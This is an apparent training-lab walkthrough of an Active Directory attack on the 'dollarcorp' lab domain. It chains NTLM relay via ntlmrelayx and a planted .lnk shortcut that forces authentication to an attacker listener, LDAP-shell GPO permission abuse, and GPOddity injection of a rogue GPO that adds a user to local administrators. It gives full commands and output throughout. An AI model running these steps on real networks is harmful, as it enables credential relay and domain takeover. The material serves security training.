# GPO Abuse- NTLM-Relay Attack:

{% tabs %}

### Relaying hashes 
![NTLM Relay](/assets/ntlm-relay.jpg)

## Method 1:

GPO abuse for admin access on dcorp-ci

early, we enumerated that there is a directory called '**AI**' on the dcorp-ci machine where '**Everyone**' has access. Looking at the directory (**\\dcorp-ci\AI**), we will find a log file.

![NTLM Relay](/assets/gpo-abuse-1.png)

It turns out that the '**AI**' folder is used for testing some automation that executes shortcuts (.lnk files) as the user '**devopsadmin**'. Recall that we enumerated a user '**devopsadmin**' has '**WriteDACL**' on **DevOps Policy**. Let's try to abuse this using **GPOddity**.

First, we will use **ntlmrelayx** tool from Ubuntu WSL instance on the student VM to relay the credentials of the devopsadmin user.

You can start a session on Ubuntu WSL by searching for wsl in the search bar or by using the Windows Terminal.

Run the following command in Ubuntu to execute ntlmrelayx. Keep in mind the following.

1. Remember to replace the IP with your own student VM.
2. Make sure that Firewall is either turned off on the student VM or you have added exceptions.

```batch
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
```
![NTLM Relay](/assets/ntlm-relay-1.png)

On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. Go to **C:\AD\Tools -> Right Click -> New -> Shortcut**. Copy the following command in the Shortcut location:

```batch
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.x' -UseDefaultCredentials"
```

It should look like this:

![NTLM Relay](/assets/obj-1.png)

Name the shortcut as studentx.lnk. Copy the lnk file to 'dcopr-ci\AI'.
```batch
C:\AD\Tools>xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
C:\AD\Tools\studentx.lnk
1 File(s) copied
```
The simulation on dcorp-ci, will execute the lnk file within a minute. This is what the listener looks like on a successful connection:

![NTLM Relay](/assets/obj-2.png)

Connect to the ldap shell started on port 11000. Run the following command on a new Ubuntu WSL session:
Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy **{0BF8D01C-1F62-4BDC-958C-57140B67D147}**:

```batch
write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```
![NTLM Relay](/assets/ntlm-relay-2.png)

**NOTE:** Alternatively, if we do not have access to any doman users, we can add a computer object and provide it the '**write_gpo_dacl**' permissions on DevOps policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}

```batch
add_computer stdx-gpattack Secretpass@123
```
**Result:**
Attempting to add a new computer with the name: stdx-gpattack$
Inferred Domain DN: DC=dollarcorp,DC=moneycorp,DC=local
Inferred Domain Name: dollarcorp.moneycorp.local
New Computer DN: CN=stdx-gpattack,CN=Computers,DC=dollarcorp,DC=moneycorp,DC=local
Adding new computer with username: stdx-gpattack$ and password: Secretpass@123 result: OK

```batch
write_gpo_dacl stdx-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```
**Result:**
Adding stdx-gpattack$ to GPO with GUID {0BF8D01C-1F62-4BDC-958C-57140B67D147}
LDAP server claims to have taken the secdescriptor. Have fun

Stop the ldap shell and ntlmrelayx using Ctrl + C.
Now, run the GPOddity command to create the new template.
```bash
cd /mnt/c/AD/Tools/GPOddity
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
```
![NTLM Relay](/assets/gpoddity.png)

Leave GPOddity running and from another Ubuntu WSL session, create and share the stdx-gp directory:

```batch
mkdir /mnt/c/AD/Tools/stdx-gp

cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
```
![NTLM Relay](/assets/gpoddity-1.png)
          
From a command prompt (Run as Administrator) on the student VM, run the following commands to allow '**Everyone**' full permission on the **stdx-gp share**:

```cmd
net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full
icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T
```

![NTLM Relay](/assets/gpoddity-2.png)
          
Verify if the **gPCfileSysPath** has been modified for the **DevOps Policy**. Run the following **PowerView command**:
```powershell
Get-DomainGPO -Identity 'DevOps Policy'
```
![NTLM Relay](/assets/gpoddity-3.png)

The update for this policy is configured to be every 2 minutes in the lab. After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci:

```powershell
C:\AD\Tools>winrs -r:dcorp-ci cmd /c "set computername && set username"
```
**Result:**
- COMPUTERNAME=DCORP-CI
- USERNAME=studentx


## Method2:
When capturing a [NTLMv1/2](https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/) hashes with tools like Responder, attackers have two options:

* crack it to retrieve cleartext passwords
* relay it to gain code execution on a target

{% hint style="warning" %}
The relayed user must have privilege on the target.
{% endhint %}

### Valid targets

In order to relay hashes, we must have valid targets. **Valid targets are machines with SMB Signing disabled**.

SMB Signing is disabled by default on every Windows OS, except Windows Server.

To create a list file of valid targets, use [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec):

```bash
cme smb <networkIP>/<cidr> --gen-relay-list relayTargets.txt
```

Create a shortcurt lnk file with the below content  and place it inside th shared AI folder.

```powershell
powershell "iwr 172.16.x.x -UseDefaultCredentials"
```

Run the below comamnd in the WSL Linux to relay the credentials to the DC.

```bash
sudo ntlmrelayx.py -t ldap://dcorp-dc.dollarcorp.moneycorp.local --http-port '80,8080' -i --no-smb-server
```

Use netcat to connect to the interactive session and use the below to add the user to have write access to the GPO.
```batch
write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

Now malicious GPO template can injected through GPOddity - [https://github.com/synacktiv/GPOddity](https://github.com/synacktiv/GPOddity)

##### In linux machine change to the tool directory
```bash
cd /mnt/c/AD/Tools/GPOddity
# Use the GPOddity
sudo python3 gpoddity.py --domain dollarcorp.moneycorp.local --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --username studentx --password xyzdsfsddsf --dc-ip 172.16.2.1 --command "net localgroup administrators studentx  /add" --rogue-smbserver-ip 172.16.100.x --rogue-smbserver-share 'std-anything' --smb-mode none 
# Create a share with the name mentioned above and host the template. Run with admin cmd
net share std-anything=C:\AD\Tools\ GPOddity\GPT_out
# Grant everyone permission to those templates
icacls "C:\AD\Tools\GPOddity\GPT_out" /grant Everyone:F /T
# Verify the persmission with
Get-DomainGPO # Check gpcfilesyspath and whenchanged
winrs -r:dcorp-ci cmd /c "set computername && set username"
```
{% endtab %} 
{% endtabs %}
